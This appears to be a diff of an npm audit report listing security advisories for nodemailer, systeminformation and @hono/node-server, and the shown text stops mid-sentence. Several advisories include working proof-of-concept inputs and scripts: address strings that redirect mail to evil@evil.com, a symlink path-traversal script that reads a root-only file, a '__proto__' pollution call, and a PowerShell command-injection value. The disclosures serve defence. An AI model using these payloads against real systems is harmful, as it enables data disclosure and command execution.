@@ -1,58 +1,489 @@
 {
   "actions": [],
   "advisories": {
-    "1241202": {
+    "1243091": {
       "findings": [
         {
-          "version": "1.0.3",
+          "version": "10.0.15",
           "paths": [
-            "apps__ai-worker>tsup>@microsoft/api-extractor>@rushstack/ts-command-line>argparse>sprintf-js"
+            "packages__adapters>nodemailer"
           ]
         }
       ],
       "found_by": null,
       "deleted": null,
-      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2026-97058\n- https://github.com/alexei/sprintf.js/issues/237\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L17\n- https://github.com/alexei/sprintf.js/blob/3a0d8c26d291b5bd9f1974877ecc50739921d6f5/src/sprintf.js#L84-L90\n- https://www.vulncheck.com/advisories/sprintf-js-through-1.1.3-denial-of-service-via-unbounded-precision\n- https://github.com/advisories/GHSA-hp3w-g68c-fv3c",
-      "created": "2026-09-24T15:31:31.000Z",
-      "id": 1241202,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-8c8m-p3m8-cjg8\n- https://github.com/nodemailer/nodemailer/commit/0a8761762ac78f2db2ba37f712f2a52a404ce011\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.1.4\n- https://github.com/advisories/GHSA-8c8m-p3m8-cjg8",
+      "created": "2026-10-23T21:53:04.000Z",
+      "id": 1243091,
       "npm_advisory_id": null,
-      "overview": "sprintf-js through 1.1.3 passes unbounded precision specifiers to toFixed, toExponential, and toPrecision methods without validation, causing uncaught RangeError exceptions. Attackers who control format strings can inject precision values exceeding ECMAScript limits to abort calling operations with minimal payload.",
+      "overview": "### Vulnerability summary\n\nRFC 5322 comments nest. addressparser ended a comment at the first `)`, including the one that closes a nested comment, and parsed the rest of the outer comment as header text. `Victim (x(y) <evil@evil.com>) <v@victim.com>` names `v@victim.com` with `x(y) <evil@evil.com>` as a comment, and Nodemailer read it as the address `evil@evil.com`. This is the same shape as the escaped parenthesis fixed in 10.1.2, reached through nesting instead of a quoted-pair. Affected: 3.0.0 through 10.1.3.\n\n### Attacker capabilities\n\nThe attacker controls the text of an address that an application passes to Nodemailer, or the From or To header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.\n\n### Realistic exploitation scenario\n\nAn application validates a submitted address with a conformant parser and allows only its own domain. The attacker submits `Victim (x(y) <evil@evil.com>) <v@victim.com>`, which validates as `v@victim.com`. Nodemailer delivers to `evil@evil.com`. In the inbound direction, a DMARC or display layer built on a conformant parser and a mail client built on mailparser disagree on the author of the same message, which is the setting for sender spoofing. The boundary crossed is the application's recipient allow list, or the author check of the receiving side.\n\n### Proof of concept\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconsole.log(addressparser(\"Victim (x(y) <evil@evil.com>) <v@victim.com>\"));\n// [ { address: 'evil@evil.com', name: 'Victim) v@victim.com' } ]\n```\n\nPython's `email._header_value_parser.get_address_list` reads the same value as `v@victim.com` with the display name `Victim`, with no defects reported.\n\nThe envelope a message gets is built from the same parse, so `sendMail({ to: \"Victim (x(y) <evil@evil.com>) <v@victim.com>\" })` issues the RCPT TO shown above.\n\n### Security impact\n\nMail intended for an approved recipient is delivered to an attacker chosen domain, disclosing its content, and parsers built on this module report a different author than conformant ones. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.\n\nThe fix counts comment depth and ends a comment only at the `)` that closes the outermost one.\n\nFound in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.",
       "reported_by": null,
-      "title": "sprintf-js vulnerable to denial of service through unbounded precision specifiers",
+      "title": "Nodemailer: A nested comment ends early in addressparser, releasing the rest of the comment as a recipient",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <10.1.4",
+      "github_advisory_id": "GHSA-8c8m-p3m8-cjg8",
+      "recommendation": "Upgrade to version 10.1.4 or later",
+      "patched_versions": ">=10.1.4",
+      "updated": "2026-10-23T21:53:05.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-8c8m-p3m8-cjg8"
+    },
+    "1243092": {
+      "findings": [
+        {
+          "version": "10.0.15",
+          "paths": [
+            "packages__adapters>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-m943-m63m-w62w\n- https://github.com/nodemailer/nodemailer/commit/1cd57d2b8c49dff048c21cdbafdb54439a7f07e2\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.1.4\n- https://github.com/advisories/GHSA-m943-m63m-w62w",
+      "created": "2026-10-23T21:51:52.000Z",
+      "id": 1243092,
+      "npm_advisory_id": null,
+      "overview": "### Vulnerability summary\n\naddressparser ends an RFC 5322 group at the first `;`, including one inside a quoted display name or a comment. The text after it is parsed again as top level recipients with the quoting flipped, so text that every conformant parser reads as a display name or comment becomes a live address. `G: (a; <evil@evil.com>) <v@victim.com>;` names only `v@victim.com`, and Nodemailer read it as the single recipient `evil@evil.com`. Affected: 3.0.0 through 10.1.3.\n\n### Attacker capabilities\n\nThe attacker controls the text of an address field that an application passes to Nodemailer, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 group that conformant parsers accept without defects.\n\n### Realistic exploitation scenario\n\nAn application validates the recipients of a submitted address list with a conformant parser and only allows addresses at its own domain. The attacker submits `G: (a; <evil@evil.com>) <v@victim.com>;`. The validator sees one mailbox, `v@victim.com`, and approves it. Nodemailer delivers to `evil@evil.com` only. The same works through a quoted display name, `G: \"a;\" \"<evil@evil.com>\" <v@victim.com>;`. The boundary crossed is the application's recipient allow list.\n\n### Proof of concept\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconsole.log(addressparser(\"G: (a; <evil@evil.com>) <v@victim.com>;\"));\n// [ { name: 'G', group: [ [Object] ] }, { address: 'evil@evil.com', name: ') v@victim.com' } ]\n```\n\nPython's `email._header_value_parser.get_address_list` reads the same value as the single mailbox `v@victim.com`, with no defects reported.\n\nThe envelope a message gets is built from the same parse, so `sendMail({ to: \"G: (a; <evil@evil.com>) <v@victim.com>;\" })` issues the RCPT TO shown above.\n\n### Security impact\n\nMail that an application intends for an approved recipient goes to a recipient chosen by the attacker, which discloses its content, and the intended recipient never receives it. The misreading only occurs on values a conformant validator approves, so correct validation is bypassed, which makes it a security issue rather than a parsing bug. Affected are applications that pass user influenced address lists to Nodemailer and consumers of the standalone parser such as mailparser.\n\nThe fix tracks quoted strings and comments inside a group and reads only a `;` outside them.\n\n\nFound in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.",
+      "reported_by": null,
+      "title": "Nodemailer: A \";\" inside a quoted string or comment ends an address group early in addressparser, turning display text into a recipient",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <10.1.4",
+      "github_advisory_id": "GHSA-m943-m63m-w62w",
+      "recommendation": "Upgrade to version 10.1.4 or later",
+      "patched_versions": ">=10.1.4",
+      "updated": "2026-10-23T21:51:54.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-m943-m63m-w62w"
+    },
+    "1243093": {
+      "findings": [
+        {
+          "version": "10.0.15",
+          "paths": [
+            "packages__adapters>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-85x2-q946-cp5h\n- https://github.com/nodemailer/nodemailer/commit/1cd57d2b8c49dff048c21cdbafdb54439a7f07e2\n- https://github.com/nodemailer/nodemailer/releases/tag/v10.1.4\n- https://github.com/advisories/GHSA-85x2-q946-cp5h",
+      "created": "2026-10-23T21:51:18.000Z",
+      "id": 1243093,
+      "npm_advisory_id": null,
+      "overview": "### Vulnerability summary\n\naddressparser ends an angle-addr at the first `>` it sees, including one inside a quoted local part, a comment or a domain literal. The domain is then read off the text in front of that `>`. `<\"a@evil.com>\"@good.com>` is the mailbox `\"a@evil.com>\"@good.com` under RFC 5322, and Nodemailer read it as an address at `evil.com`. The unbracketed spelling of the same value was already read correctly. Affected: 3.0.0 through 10.1.3.\n\n### Attacker capabilities\n\nThe attacker controls the text of a recipient or sender address that an application passes to Nodemailer, for example a To value entered in a contact or invite form, or the header of an inbound message parsed with mailparser. No access to the application, its configuration or its credentials is needed. The value is a syntactically valid RFC 5322 address that conformant parsers accept without defects.\n\n### Realistic exploitation scenario\n\nAn application lets users send invitations or notifications only to addresses at an allowed domain and validates the submitted value with a conformant parser or by checking its domain. The attacker submits `<\"a@evil.com>\"@good.com>`, which validates as a `good.com` mailbox. Nodemailer then parses the same value, issues `RCPT TO:<\"\\\"a\"@evil.com>` and the message, with whatever content the application puts into it, is delivered to the attacker's domain. The security boundary crossed is the application's recipient allow list. In the inbound direction, mailparser reports a different address than a conformant reader of the same header, so a display or policy layer built on the two disagrees.\n\n### Proof of concept\n\n```js\nconst addressparser = require('nodemailer/lib/addressparser');\nconsole.log(addressparser(\"<\\\"a@evil.com>\\\"@good.com>\"));\n// [ { address: '\"a@evil.com', name: '@good.com>' } ]\n```\n\nPython's `email._header_value_parser.get_address_list` reads the same value as `\"a@evil.com>\"@good.com`, with no defects reported.\n\nThe envelope a message gets is built from the same parse, so `sendMail({ to: \"<\\\"a@evil.com>\\\"@good.com>\" })` issues the RCPT TO shown above.\n\n### Security impact\n\nMail that an application intends for an allowed domain is delivered to a domain chosen by the attacker, which discloses its content. It is a security vulnerability rather than a parsing bug because the misreading only occurs for values that a conformant validator approves, so validation done the right way is bypassed. Affected are applications that pass user influenced addresses to Nodemailer and consumers of the standalone parser such as mailparser.\n\nThe fix tracks quoted strings, comments and domain literals inside an angle-addr and reads only a `>` outside them.\n\nFound in an internal review of addressparser on 2026-10-18. Verified on 3.0.0, 6.9.16 and 10.1.3.",
+      "reported_by": null,
+      "title": "Nodemailer: A \">\" inside a quoted local part ends an angle-addr early in addressparser, delivering to a domain the header does not name",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": ">=3.0.0 <10.1.4",
+      "github_advisory_id": "GHSA-85x2-q946-cp5h",
+      "recommendation": "Upgrade to version 10.1.4 or later",
+      "patched_versions": ">=10.1.4",
+      "updated": "2026-10-23T21:51:19.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-85x2-q946-cp5h"
+    },
+    "1243616": {
+      "findings": [
+        {
+          "version": "5.31.7",
+          "paths": [
+            "apps__ai-worker>@opentelemetry/auto-instrumentations-node>@opentelemetry/instrumentation-host-metrics>systeminformation"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-4vjg-vx72-qq4g\n- https://nvd.nist.gov/vuln/detail/CVE-2026-116673\n- https://github.com/sebhildebrandt/systeminformation/commit/8d294b3139fec654a912969ac898037578a218cd\n- https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.33.14\n- https://github.com/advisories/GHSA-4vjg-vx72-qq4g",
+      "created": "2026-10-28T21:13:50.000Z",
+      "id": 1243616,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nOn Linux, `systeminformation@5.33.13` builds `/sys/class/net/<iface>` paths from the caller-supplied `networkStats(iface)` value without checking that the resolved path stays inside `/sys/class/net`. A caller who can create a symlink fixture and control the value passed to this API can make the function return the first line of a file readable by the Node process.\n\n### Details\n\nThe strict string sanitizer removes shell metacharacters but retains `/` and `.`. The Linux implementation uses this value in an `fs.existsSync('/sys/class/net/' + iface)` check and then in seven `cat` paths for interface statistics. Both operations follow `..` path components and symlinks. The code does not validate the value as an interface name or enforce resolved-path containment.\n\nThe proof of concept below creates the expected statistics files in a directory writable by the unprivileged `nobody` user. Its `operstate` symlink points to a synthetic mode-0600 file under `/root`. The package call runs as root and returns the marker even though `nobody` cannot read that file.\n\n### PoC\n\nUse a disposable Ubuntu Linux VM with Node.js, npm, and `runuser` installed. These steps create and remove only a synthetic marker and a temporary fixture. Install the affected version:\n\n```sh\nmkdir si-netstats-repro\ncd si-netstats-repro\nnpm init -y\nnpm install systeminformation@5.33.13\n```\n\nSave the following as `poc.cjs` in that directory, then run `sudo node poc.cjs`:\n\n```js\n'use strict';\n\nconst fs = require('node:fs');\nconst { execFileSync } = require('node:child_process');\nconst si = require('systeminformation');\n\nconst root = `/tmp/si-netstats-${process.pid}`;\nconst secret = `/root/si-netstats-secret-${process.pid}`;\nconst marker = `SYNTHETIC_ROOT_ONLY_MARKER_${process.pid}`;\nconst fixtureCode = `\n  const fs = require('node:fs');\n  const root = process.env.SI_FIXTURE_ROOT;\n  const secret = process.env.SI_SECRET;\n  fs.mkdirSync(root + '/statistics', { recursive: true });\n  for (const name of ['rx_bytes', 'tx_bytes', 'rx_dropped', 'rx_errors', 'tx_dropped', 'tx_errors']) {\n    fs.writeFileSync(root + '/statistics/' + name, '0\\\\n');\n  }\n  fs.symlinkSync(secret, root + '/operstate');\n`;\n\n(async () => {\n  try {\n    fs.writeFileSync(secret, marker + '\\\\n', { mode: 0o600 });\n    fs.chmodSync(secret, 0o600);\n\n    execFileSync('runuser', [\n      '-u', 'nobody', '--', 'env',\n      `SI_FIXTURE_ROOT=${root}`,\n      `SI_SECRET=${secret}`,\n      process.execPath, '-e', fixtureCode\n    ], { stdio: 'inherit' });\n\n    let nobodyCouldRead = true;\n    try {\n      execFileSync('runuser', ['-u', 'nobody', '--', 'cat', secret], { stdio: 'ignore' });\n    } catch {\n      nobodyCouldRead = false;\n    }\n    if (nobodyCouldRead) throw new Error('negative control failed: nobody read the marker');\n\n    const iface = '../'.repeat(24) + root.slice(1);\n    const rows = await si.networkStats(iface);\n    const returned = String(rows[0]?.operstate ?? '').trim();\n    const success = returned === marker;\n\n    console.log(JSON.stringify({\n      nobodyCouldRead,\n      libraryReturnedRootOnlyMarker: success,\n      returnedOperstate: returned\n    }, null, 2));\n\n    if (!success) process.exitCode = 1;\n  } finally {\n    fs.rmSync(root, { recursive: true, force: true });\n    fs.rmSync(secret, { force: true });\n  }\n})().catch((error) => {\n  console.error(error);\n  process.exitCode = 1;\n});\n```\n\nExpected result:\n\n```json\n{\n  \"nobodyCouldRead\": false,\n  \"libraryReturnedRootOnlyMarker\": true,\n  \"returnedOperstate\": \"SYNTHETIC_ROOT_ONLY_MARKER_<pid>\"\n}\n```\n\n### Impact\n\nThe demonstrated impact is disclosure to the API caller of the first line of a file readable by the Node process. The package is a library and does not expose a network endpoint. A consuming application route that forwards remote attacker input to this API and returns its result was not established, so remote exploitability is not demonstrated.",
+      "reported_by": null,
+      "title": "systeminformation has path traversal in Linux networkStats() that allows symlink-based file disclosure outside /sys/class/net",
       "metadata": null,
       "cves": [
-        "CVE-2026-97058"
+        "CVE-2026-116673"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "systeminformation",
+      "vulnerable_versions": "<5.33.14",
+      "github_advisory_id": "GHSA-4vjg-vx72-qq4g",
+      "recommendation": "Upgrade to version 5.33.14 or later",
+      "patched_versions": ">=5.33.14",
+      "updated": "2026-10-28T21:13:51.000Z",
+      "cvss": {
+        "score": 3.3,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-59"
+      ],
+      "url": "https://github.com/advisories/GHSA-4vjg-vx72-qq4g"
+    },
+    "1243617": {
+      "findings": [
+        {
+          "version": "5.31.7",
+          "paths": [
+            "apps__ai-worker>@opentelemetry/auto-instrumentations-node>@opentelemetry/instrumentation-host-metrics>systeminformation"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-7648-jmwf-vw7j\n- https://nvd.nist.gov/vuln/detail/CVE-2026-116674\n- https://github.com/sebhildebrandt/systeminformation/commit/6ff25a1ebc0b1fdc7a8aa3507e46f22007da2969\n- https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.33.13\n- https://github.com/advisories/GHSA-7648-jmwf-vw7j",
+      "created": "2026-10-28T21:13:32.000Z",
+      "id": 1243617,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\n`networkStats()` keeps a per interface cache for computing `rx_sec` / `tx_sec` between calls.\nThe cache is a plain JavaScript object and is indexed with the interface name the caller\nsupplied. Passing the name `__proto__` makes every cache write land on `Object.prototype`\ninstead of the cache, polluting every object in the Node.js process.\n\nAn application is affected if it passes untrusted input as the `ifaces` argument of\n`si.networkStats()` and runs on FreeBSD, OpenBSD or NetBSD.\n\n## Details\n\n### The vulnerable code\n\n`lib/network.js` declares the cache as a plain object:\n\n```js\nconst _network = {};\n```\n\n`calcNetworkSpeed()` writes into it, keyed by the interface name:\n\n```js\n} else {\n  if (!_network[iface]) {\n    _network[iface] = {};\n  }\n  _network[iface].rx_bytes  = rx_bytes;\n  _network[iface].tx_bytes  = tx_bytes;\n  _network[iface].rx_sec    = null;\n  _network[iface].tx_sec    = null;\n  _network[iface].ms        = Date.now();\n  _network[iface].last_ms   = 0;\n  _network[iface].operstate = operstate;\n}\n```\n\nWith `iface === '__proto__'` this misbehaves twice:\n\n1. `_network['__proto__']` does not read a missing own property — it invokes the inherited\n   `__proto__` getter and returns `Object.prototype`, which is truthy. The\n   `if (!_network[iface])` guard therefore never creates the `{}` placeholder.\n2. Each following assignment writes onto `Object.prototype`.\n\nAfter one call, `rx_bytes`, `tx_bytes`, `rx_sec`, `tx_sec`, `ms`, `last_ms` and `operstate`\nare visible on **every** object in the process. A second call takes the other branch\n(`_network['__proto__'].ms` is now truthy) and keeps them updated.\n\n### Why the existing sanitizing does not help\n\nThe interface name does pass through `util.sanitizeString(iface, true)` before it is used as\nthe cache key. That function is a **shell metacharacter** filter, built to stop command\ninjection in the `netstat` / `ifconfig` invocations — a different threat. Property names made\nof letters and underscores are legitimate interface names and pass through untouched:\n\n```\n\"a;id\"        -> \"aid\"\n\"a$(id)\"      -> \"aid\"\n\"a|id\"        -> \"aid\"\n\"a`id`\"       -> \"aid\"\n\"__proto__\"   -> \"__proto__\"     <-- unchanged\n\"constructor\" -> \"constructor\"   <-- unchanged\n```\n\nThe sanitizer is doing its job; the gap is that no layer treats the value as an *object key*.\n\n### Reachability\n\nThe cache write is guarded incidentally on three of four platform branches. These guards exist\nfor unrelated reasons and are not a deliberate defence:\n\n| Platform | Code path | Reachable with an arbitrary name? |\n| --- | --- | --- |\n| Linux / Android | `fs.existsSync('/sys/class/net/' + ifaceSanitized)` | **No** — a non-existent interface returns early |\n| macOS | requires `netstat` to emit a data row beyond the header | **No** — verified on macOS 27, `Object.prototype` stays clean |\n| Windows | `if (rx_bytes && tx_bytes)` — requires a real adapter match | **No** |\n| **FreeBSD / OpenBSD / NetBSD** | `if (!error) { …; result = calcNetworkSpeed(ifaceSanitized, …) }` | **Yes** — the call sits outside the parsing loop, so any successful `netstat` exit reaches it, and `netstat -ibndI <unknown>` prints only its header and exits `0` |\n\nThe important part is not that three platforms happen to be safe, but that nothing in the\ndesign prevents the write. Any future platform branch without such a guard reopens the issue,\nwhich is why the fix is applied at the cache rather than at the call sites.\n\n### Age\n\nThe pattern predates the v5 line — `git log -S \"_network[iface] = {}\"` traces it back to a\nrefactoring before `v3.42.5`. The v3 and v4 lines are end of life; the advisory covers v5.\n\n## Impact\n\nThe attacker controls which attributes appear on `Object.prototype` but not their values —\nthose come from the interface statistics (`rx_bytes`, `ms`, `operstate` …). The attribute\n*names* are fixed by the library, so this is not an arbitrary-key pollution primitive.\n\nThe consequences are therefore application specific and arise from name collisions:\n\n- Any application code that tests `if (obj.operstate)`, `if (obj.ms)` or similar on an object\n  that should not have those properties now takes the wrong branch.\n- `for…in` loops over plain objects gain seven extra enumerable keys, which can corrupt\n  serialisation, configuration merging or validation logic.\n- Libraries that use `{}` as a lookup map and check membership with `in` or truthiness can\n  return values for keys that were never inserted.\n\nNo path to remote code execution is known, and the values cannot be chosen by the attacker.\n\n## Proof of concept\n\n### The underlying primitive (any platform)\n\n```js\nconst { calcNetworkSpeed } = require('systeminformation/lib/network.js'); // internal\nconst cache = {};                       // the declaration used by the library\ncalcNetworkSpeed('__proto__', 1, 2, 'up', 0, 0, 0, 0);\n\nconsole.log({}.rx_bytes);               // 1\nconsole.log({}.operstate);              // 'up'\nconsole.log(Object.prototype.hasOwnProperty('rx_bytes')); // true\n```\n\n### End to end through the public API (FreeBSD / OpenBSD / NetBSD)\n\n```js\nconst si = require('systeminformation');\n\n(async () => {\n  console.log('before:', {}.operstate);   // undefined\n  await si.networkStats('__proto__');     // an attacker supplied interface name\n  console.log('after :', {}.operstate);   // 'up'  -> Object.prototype is polluted\n})();\n```\n\nOn Linux, macOS and Windows the same call returns an empty result set and leaves\n`Object.prototype` untouched, for the reasons in the *Reachability* table.\n\n## Patch\n\n`lib/network.js` — give the cache a null prototype, so `__proto__` becomes an ordinary own\nproperty instead of a setter into the prototype chain:\n\n```diff\n-const _network = {};\n+const _network = Object.create(null);\n```\n\nThis is the smallest change that fixes the class of problem rather than one reachable path:\n\n- It is independent of the platform branches, so no guard has to be added or maintained.\n- It keeps behaviour identical for every legitimate interface name — `Object.keys()`,\n  member reads and writes all work unchanged on a null prototype object.\n- It matches the pattern already used elsewhere in the codebase\n  (`lib/filesystem.js:114-115`, `lib/graphics.js:1060`, `lib/graphics.js:1087`).\n- `Object.create` is ES5.1, well below the declared `engines.node >= 10.0.0`.\n\nAfter the patch the hostile name is stored as a normal cache entry:\n\n```js\nconst cache = Object.create(null);\n// ... cache['__proto__'] holds the stats object, Object.prototype is untouched\n```\n\n## Workarounds\n\nFor users who cannot upgrade immediately, either of these is sufficient:\n\n1. **Validate the interface name before calling** — accept only names returned by\n   `si.networkInterfaces()`, or reject the names `__proto__`, `constructor` and `prototype`.\n2. **Never pass untrusted input** as the `ifaces` argument. Passing `'*'` or omitting the\n   argument is unaffected, because those names come from the system rather than the caller.\n\nFreezing `Object.prototype` (`Object.freeze(Object.prototype)`) also prevents the write, but it\nhas wide-reaching side effects on other dependencies and is not recommended as a general\nmitigation.\n\n## Affected versions\n\nAll `5.x` releases up to and including `5.33.12`. Earlier major lines contain the same pattern\nbut are end of life.\n\n### What was verified, and what was not\n\nVerified on this machine (macOS 27, Node 24):\n\n- the pollution primitive, by calling the cache write with `iface = '__proto__'`;\n- that `util.sanitizeString('__proto__', true)` returns the string unchanged, while shell\n  metacharacters are stripped;\n- that unpatched v5 on macOS does **not** pollute through the public API;\n- that `netstat -bdnI <unknown-interface>` prints only its header and exits `0`;\n- that the patch stores the hostile key as an own property and leaves `Object.prototype` clean.\n\nNot verified, because no such host was available:\n\n- end to end exploitation on FreeBSD, OpenBSD or NetBSD. That conclusion is derived from\n  reading the BSD branch of `networkStatsSingle()` — where the `calcNetworkSpeed()` call sits\n  outside the row parsing loop and is reached whenever `netstat` exits successfully — combined\n  with the observed `netstat` exit behaviour above. Worth confirming on a BSD host before\n  publishing, since the affected-platform list depends on it.",
+      "reported_by": null,
+      "title": "systeminformation has prototype pollution in `networkStats()` via the interface name",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-116674"
       ],
       "access": "public",
       "severity": "moderate",
-      "module_name": "sprintf-js",
-      "vulnerable_versions": "<=1.1.3",
-      "github_advisory_id": "GHSA-hp3w-g68c-fv3c",
-      "recommendation": "None",
-      "patched_versions": "<0.0.0",
-      "updated": "2026-10-05T23:47:35.000Z",
+      "module_name": "systeminformation",
+      "vulnerable_versions": "<5.33.13",
+      "github_advisory_id": "GHSA-7648-jmwf-vw7j",
+      "recommendation": "Upgrade to version 5.33.13 or later",
+      "patched_versions": ">=5.33.13",
+      "updated": "2026-10-28T21:13:33.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:L"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-7648-jmwf-vw7j"
+    },
+    "1243661": {
+      "findings": [
+        {
+          "version": "2.0.11",
+          "paths": [
+            "packages__db>prisma>@prisma/dev>@hono/node-server"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/honojs/node-server/security/advisories/GHSA-rmxm-3fg6-px4f\n- https://github.com/honojs/node-server/commit/982179278529d5673812116b042829f27794966f\n- https://github.com/honojs/node-server/releases/tag/v2.1.3\n- https://github.com/advisories/GHSA-rmxm-3fg6-px4f",
+      "created": "2026-10-28T21:05:00.000Z",
+      "id": 1243661,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`serveStatic` decodes the request path a second time after Hono has already decoded it for routing. A crafted request can be routed as one path and served as another, so middleware mounted on a static prefix does not run for a file under that prefix.\n\n### Details\n\nHono decodes the request path once before routing. `serveStatic` decoded it again before resolving the file. With a malformed percent-encoded sequence, the first decode leaves part of the path encoded, the router matches the encoded form, and the second decode resolves the real directory. The file is still resolved inside the configured root; this is not a traversal outside it.\n\n### Impact\n\nAn unauthenticated attacker may reach static files without the middleware on their prefix running, for example an authentication check. This affects applications that mount middleware on part of the directory served by `serveStatic`. Applications that serve only public files are not affected.",
+      "reported_by": null,
+      "title": "@hono/node-server: `serveStatic` decodes the request path a second time, leading to bypass of middleware on static paths",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-118663"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@hono/node-server",
+      "vulnerable_versions": ">=1.19.10 <2.1.3",
+      "github_advisory_id": "GHSA-rmxm-3fg6-px4f",
+      "recommendation": "Upgrade to version 2.1.3 or later",
+      "patched_versions": ">=2.1.3",
+      "updated": "2026-10-28T21:05:02.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-174"
+      ],
+      "url": "https://github.com/advisories/GHSA-rmxm-3fg6-px4f"
+    },
+    "1243663": {
+      "findings": [
+        {
+          "version": "5.31.7",
+          "paths": [
+            "apps__ai-worker>@opentelemetry/auto-instrumentations-node>@opentelemetry/instrumentation-host-metrics>systeminformation"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/sebhildebrandt/systeminformation/security/advisories/GHSA-3f7j-7jwc-fxfj\n- https://nvd.nist.gov/vuln/detail/CVE-2026-116576\n- https://github.com/sebhildebrandt/systeminformation/commit/5014c6d25cfce7363b937977327baa853cdba0bf\n- https://github.com/sebhildebrandt/systeminformation/releases/tag/v5.33.16\n- https://github.com/advisories/GHSA-3f7j-7jwc-fxfj",
+      "created": "2026-10-28T22:42:49.000Z",
+      "id": 1243663,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nOn Windows, `systeminformation@5.33.15` builds a PowerShell command using the value passed to `services()`. The default sanitizer removes ASCII quotes but keeps Unicode curly quotes, spaces, and parentheses. A crafted service name can use those characters to break out of the generated filter string and run a PowerShell expression. The expression runs with the permissions of the Node.js process.\n\nThis report confirms version `5.33.15`. Other package versions have not been checked.\n\n### Details\n\nIn `lib/processes.js`, `services()` sanitizes the caller's string with `sanitizeShellString()` and later inserts each resulting name into a `Get-CimInstance Win32_Service -Filter` command. The Windows branch passes that command to `util.powerShell()`.\n\nThe sanitizer in `lib/util.js` removes the ASCII double quote, but it does not remove U+201C or U+201D, the left and right curly double quotation marks. It also permits spaces and parentheses when called in its default, non-strict mode. PowerShell accepts the curly marks as string delimiters, so an input can end the filter string and place a command expression in the generated command.\n\nFor example, the input below uses curly quotation marks to end the generated filter string and execute `New-Item`. I reproduced this call on Windows against the checked-out `systeminformation@5.33.15` source; it created a marker file with the Node.js process account.\n\n### Proof of concept\n\nRun this on Windows in a disposable directory with Node.js and PowerShell available:\n\n```powershell\nmkdir si-command-injection-repro\ncd si-command-injection-repro\nnpm init -y\nnpm install systeminformation@5.33.15\n```\n\nSave the following as `poc.cjs`, then run `node poc.cjs`:\n\n```js\n'use strict';\n\nconst fs = require('node:fs');\nconst path = require('node:path');\nconst si = require('systeminformation');\n\n(async () => {\n  const markerName = `si-injection-${process.pid}.txt`;\n  const markerPath = path.join(process.cwd(), markerName);\n  fs.rmSync(markerPath, { force: true });\n\n  try {\n    await si.services(`not-a-service” (New-Item -Name ${markerName} -ItemType File -Force) “`);\n    console.log(`markerCreated=${fs.existsSync(markerPath)}`);\n  } finally {\n    fs.rmSync(markerPath, { force: true });\n  }\n})().catch((error) => {\n  console.error(error);\n  process.exitCode = 1;\n});\n```\n\nExpected output:\n\n```text\nmarkerCreated=true\n```\n\nThe Windows run returned an array and created the marker (`markerCreated: true`). A benign input left the marker absent. The script 